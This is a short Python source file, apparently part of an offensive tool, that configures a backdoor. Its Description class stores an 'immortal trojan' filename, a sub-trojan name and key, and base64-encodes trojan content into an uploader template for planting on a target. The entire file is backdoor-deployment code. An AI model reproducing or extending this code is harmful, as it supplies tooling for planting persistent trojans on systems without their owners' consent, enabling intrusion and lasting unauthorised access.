import base64
#后门基本配置
class Description:
    ___trojContent=''
    def __init__(self,immortalTrojFilename,subTrojFileName,trojKey,immortalTrojContent):
        self.immortalTrojFilename=immortalTrojFilename
        self.subTrojFilename=subTrojFileName
        self.trojKey=trojKey
        self.trojContent=immortalTrojContent
    @property
    def subTrojectParam(self):
        return self.trojKey[:5]
    @property
    def trojContent(self):
        return self.__trojContent
    @trojContent.setter
    def trojContent(self,v):
        tmpTrojBase64Code=base64.b64encode(v.encode("utf-8")).decode("utf-8")
        self.__trojContent=config.uploader.format(tmpTrojBase64Code,self.immortalTrojFilename)